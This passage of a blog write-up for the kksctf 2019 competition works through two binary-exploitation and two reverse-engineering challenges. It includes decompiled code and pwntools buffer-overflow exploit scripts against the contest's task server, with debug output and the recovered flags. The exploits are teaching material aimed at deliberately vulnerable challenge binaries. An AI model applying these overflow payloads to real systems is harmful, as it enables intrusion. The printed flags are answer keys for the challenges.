class="string">&#x27;/home/pwn/Documents/kksctf/baby_bof&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ ./baby_bof </span><br><span class="line">We have prepared a buffer overflow <span class="keyword">for</span> you</span><br><span class="line">Can you get use of it?</span><br><span class="line">Enter your name: hahaha?</span><br><span class="line">Hello, hahaha?!</span><br><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ </span><br></pre></td></tr></table></figure>

<p>So open it with IDA32 and press “F5”, we could see the main function’s Pseudocode:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-100h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;We have prepared a buffer overflow for you&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you get use of it?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your name: &quot;</span>);</span><br><span class="line">  read_wrapper(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s!\n&quot;</span>, &amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The program will ask your name to input, in function read_wrapper, it will use <code>gets</code> function to set the <code>s</code>‘s value to our input:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">read_wrapper</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+0h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(s);</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[i] &gt; <span class="string">&#x27;@&#x27;</span> &amp;&amp; s[i] &lt;= <span class="string">&#x27;Z&#x27;</span> )</span><br><span class="line">      s[i] += <span class="number">0x20</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>According to this, there is no length limitation for <code>s</code>. And <code>s</code>‘s address is “ebp-100h”, so we can input data like <code>a*0x100 + b*0x4 + jmp_addr</code> to overwrite the return address, and we also can see this in IDA’s Stack Window.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">-00000100 ; D&#x2F;A&#x2F;*   : change type (data&#x2F;ascii&#x2F;array)</span><br><span class="line">-00000100 ; N       : rename</span><br><span class="line">-00000100 ; U       : undefine</span><br><span class="line">-00000100 ; Use data definition commands to create local variables and function arguments.</span><br><span class="line">-00000100 ; Two special fields &quot; r&quot; and &quot; s&quot; represent return address and saved registers.</span><br><span class="line">-00000100 ; Frame size: 100; Saved regs: 4; Purge: 0</span><br><span class="line">-00000100 ;</span><br><span class="line">-00000100</span><br><span class="line">-00000100 s               db ?</span><br><span class="line">-000000FF                 db ? ; undefined</span><br><span class="line">......</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 argc            dd ?</span><br><span class="line">+0000000C argv            dd ?                    ; offset</span><br><span class="line">+00000010 envp            dd ?                    ; offset</span><br><span class="line">+00000014</span><br><span class="line">+00000014 ; end of stack variables</span><br></pre></td></tr></table></figure>

<p>Another point is that we should find the <code>jmp_addr</code>, usually  we should make it as the <code>system(&quot;/bin/sh&quot;);</code>,  but in this chall, we can find a function named <code>win()</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">win</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+3h] [ebp-25h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+20h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_8048830);<span class="comment">// &#x27;r&#x27;</span></span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;flag not found&quot;</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">29</span>, stream);</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">0xCAFEBABE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Almost there :)&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Here it comes: %s\n&quot;</span>, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We could see this function will open current working directory’s file “flag.txt”, and check the argument “a1”, if “a1” equal to 0xCAFEBABE, then print the file contents, that’s flag.</p>
<p>We know that it should firstly push arguments to stack before normally calling a normal function, and the data we input will increase in stack, so the data we should construct is <code>a*0x100 + b*0x4 + win_addr + call_before_next_ins_addr + p32(0xcafebabe)</code>, as the IDA shows,  the win() function start address is 0x80485F6, so the last exploit is:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># for kksctf-baby_bof</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">sh = remote(<span class="string">&quot;tasks.open.kksctf.ru&quot;</span>, <span class="number">10002</span>)</span><br><span class="line"><span class="comment">#sh = process(&quot;./baby_bof&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">win_addr = <span class="number">0x80485f6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x100</span> + <span class="string">&quot;b&quot;</span>*<span class="number">0x04</span> + p32(win_addr) + p32(<span class="number">0x804850c</span>) + p32(<span class="number">0xCAFEBABE</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Enter your name: &quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># pause() # to Debug</span></span><br><span class="line">sh.interactive() <span class="comment">#the last line should have, to keep seeing flag.</span></span><br></pre></td></tr></table></figure>

<p>And run it in terminal:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ python exp.py </span><br><span class="line">[+] Opening connection to tasks.open.kksctf.ru on port 10002: Done</span><br><span class="line">[DEBUG] Received 0x2a bytes:</span><br><span class="line">    <span class="string">&#x27;We have prepared a buffer overflow for you&#x27;</span></span><br><span class="line">[DEBUG] Received 0x29 bytes:</span><br><span class="line">    <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Can you get use of it?\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Enter your name: &#x27;</span></span><br><span class="line">[DEBUG] Sent 0x111 bytes:</span><br><span class="line">    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    00000100  62 62 62 62  f6 85 04 08  0c 85 04 08  be ba fe ca  │bbbb│····│····│····│</span><br><span class="line">    00000110  0a                                                  │·│</span><br><span class="line">    00000111</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[DEBUG] Received 0x119 bytes:</span><br><span class="line">    00000000  48 65 6c 6c  6f 2c 20 61  61 61 61 61  61 61 61 61  │Hell│o, a│aaaa│aaaa│</span><br><span class="line">    00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    00000100  61 61 61 61  61 61 61 62  62 62 62 f6  85 04 08 0c  │aaaa│aaab│bbb·│····│</span><br><span class="line">    00000110  85 04 08 be  ba fe ca 21  0a                        │····│···!│·│</span><br><span class="line">    00000119</span><br><span class="line">Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb��\x0c\x85\x0\xbe\xba\xfe�!</span><br><span class="line">[DEBUG] Received 0x7e bytes:</span><br><span class="line">    <span class="string">&#x27;Here it comes: kks&#123;0v3rf10w_15_my_1!f3&#125;\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;/home/ctf/redir.sh: line 4:    74 Segmentation fault      timeout -k 120 120 ./chall\n&#x27;</span></span><br><span class="line">Here it comes: kks&#123;0v3rf10w_15_my_1!f3&#125;</span><br><span class="line"></span><br><span class="line">/home/ctf/redir.sh: line 4:    74 Segmentation fault      timeout -k 120 120 ./chall</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$  </span><br></pre></td></tr></table></figure>

<ul>
<li><strong>flag</strong>: kks{0v3rf10w_15_my_1!f3}</li>
</ul>
<h4 id="insane-pwn"><a href="#insane-pwn" class="headerlink" title="insane pwn"></a>insane pwn</h4><p>This is a simple chall so I can solve it. Check the file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ file insane_pwn </span><br><span class="line">insane_pwn: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=fd8cb6b2a59db247f16c14859388e6925385e541, not stripped</span><br><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ checksec insane_pwn </span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/Documents/kksctf/insane_pwn&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>It seems all protection are enabled, but let’s look it in IDA. Here is its main function:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+8h] [ebp-114h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+10Ch] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+110h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+114h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  v5 = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hello! I am x86 vulnerable programm and have and inner buffer size of 256 bites&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you lead me to segmentation fault please?&quot;</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">0x108</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">0xDEADBEEF</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hit me harder!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    print_flag();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Clearly, we can see if the <code>v5</code> variable is not equal to 0xDEADBEEF, then it will go to print_flag func to print flag. But the code above set <code>v5</code> to 0xDEADBEEF, and we also could see that func truely print flag:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">print_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [esp+8h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Fh] [ebp-29h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Thank you! you can have your flag: &quot;</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    fgets(&amp;s, <span class="number">29</span>, stream);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">    fclose(stream);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;flag not found&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>So our target is to input something to overflow the <code>v5</code> variable. According to main func, we know that <code>s</code> variable is in <code>[ebp-114h]</code>, and <code>v5</code> variable is in <code>[ebp-10h]</code>, so their distance is 0x104. Main func use <code>fgets</code> func to get our input, and it has length limitation(0x108), therefore our payload will be <code>&#39;a&#39;*0x104 + &#39;aa&#39;</code>, then the <code>v5</code> variable will be 0xCAFE6161. So the last exploit is:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># for kksctf-insane_pwn</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">sh = remote(<span class="string">&quot;tasks.open.kksctf.ru&quot;</span>, <span class="number">10003</span>)</span><br><span class="line"><span class="comment">#sh = process(&quot;./insane_pwn&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x104</span> + <span class="string">&quot;aa&quot;</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Can you lead me to segmentation fault please?&quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>And the result is:</p>
<p><img src="/2019/12/30/kksctf-writeup/flag.png" alt="flag"></p>
<ul>
<li><strong>flag</strong>: kks{W0w_th15_w@5_4w350m3}</li>
</ul>
<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h4 id="Buffalo-reverse"><a href="#Buffalo-reverse" class="headerlink" title="Buffalo reverse"></a>Buffalo reverse</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-94h]</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+30h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please, enter password for decryption: &quot;</span>, argv, envp);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Decrypting, please wait...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">17</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v5[i] = crypto_data[i] ^ s[i % <span class="number">8</span>];</span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;0x%02x ^ 0x%02x = 0x%02x %c\n&quot;</span>,</span><br><span class="line">        crypto_data[i],</span><br><span class="line">        (<span class="keyword">unsigned</span> __int8)s[i % <span class="number">8</span>],</span><br><span class="line">        (<span class="keyword">unsigned</span> __int8)v5[i],</span><br><span class="line">        (<span class="keyword">unsigned</span> __int8)v5[i]);</span><br><span class="line">      sleep(<span class="number">1u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your flag is: %s\n&quot;</span>, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Password don&#x27;t match.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Easy to understand, it’s xor decrypt. But the password needs us to brute, the description said the flag is embeed with brackets, so we can guess the last character is “}”, because the key length is 8, so we can expand and then know the flag is like “<code>*l*******b*******&#125;</code>“, we can guess the first 5 characters are “<code>flag&#123;</code>“, so the flag is like “<code>flag&#123;***_brut***e&#125;</code>“, but then we couldn’t get more, and now we know the key is “deadb***”. At last we need to read the description again, it said:</p>
<blockquote>
<p>Buffalo dead while reversing this task.</p>
</blockquote>
<p>there is a brainfuck idea: dead buffalo, so the key is “deadbeef”, and that’s an interesting value.</p>
<p>So the flag:</p>
<p><img src="/2019/12/30/kksctf-writeup/TIM%E6%88%AA%E5%9B%BE20191228175539.png" alt="TIM截图20191228175539"></p>
<h4 id="Xmas-Tree-2"><a href="#Xmas-Tree-2" class="headerlink" title="Xmas Tree 2"></a>Xmas Tree 2</h4><p>It gives us the source code, and it get a value from argv[1], that’s the main function’s first parameter. And then check the value with 5 <code>if</code> conditions, if all are right, then print the flag through decoding.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> data_1[<span class="number">20</span>] = <span class="string">&quot;_a&quot;</span><span class="string">&quot;cd&quot;</span><span class="string">&quot;eh&quot;</span><span class="string">&quot;ik&quot;</span><span class="string">&quot;lm&quot;</span><span class="string">&quot;no&quot;</span><span class="string">&quot;pr&quot;</span><span class="string">&quot;su&quot;</span><span class="string">&quot;wy&quot;</span><span class="string">&quot;\0&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> key = atoi (argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">if</span> (((<span class="keyword">unsigned</span> <span class="keyword">char</span>*)&amp;key)[<span class="number">0</span>] == <span class="number">0xAF</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (((<span class="keyword">short</span>*)&amp;key)[<span class="number">1</span>] == <span class="number">0x3174</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (((key &gt;&gt; <span class="number">22</span>) &amp; <span class="number">0xFF</span>) == <span class="number">0xC5</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span> (*(((<span class="keyword">char</span>*)((&amp;key) + <span class="number">2</span>)) - <span class="number">7</span>) == <span class="number">0x19</span>) &#123;</span><br><span class="line">					<span class="keyword">if</span> (((((<span class="keyword">short</span>*)(((<span class="keyword">char</span>*)(&amp;key)) + <span class="number">13</span>) - <span class="number">5</span>)[<span class="number">0</span>] &gt;&gt; <span class="number">0</span>) &amp; <span class="number">0xff</span>) == <span class="number">0x31</span>) &#123;</span><br></pre></td></tr></table></figure>

<p>It’s easy to get the value from these 5 <code>if</code> conditions, the first byte is <code>0xAF</code>, and the last 2 bytes’ value is <code>0x3174</code>, the second byte is <code>0x19</code>, and it’s little endian code, so the value is <code>0x317419AF</code>, this value moves to right in 22 bits, also satisfy the third codition <code>0xC5</code>, the last condition mean the last byte is <code>0x31</code>, I seems like that:</p>
<p><img src="/2019/12/30/kksctf-writeup/IMG_20200103_211413.jpg" alt="IMG_20200103_211413"></p>
<p>And finally, <code>0x317419AF</code> convert to decimal is <code>829692335</code>, the flag is:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ gcc task_tree.c</span><br><span class="line"></span><br><span class="line">name@Desktop /cygdrive/e/kksctf/reverse/Xmas Tree 2</span><br><span class="line">$ ./a.exe 829692335</span><br><span class="line">kks&#123;c_is_simple_only_when_you_are_drunk&#125;</span><br><span class="line"></span><br><span class="line">name@Desktop /cygdrive/e/kksctf/reverse/Xmas Tree 2</span><br><span class="line">$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>flag: kks{c_is_simple_only_when_you_are_drunk}</li>
</ul>
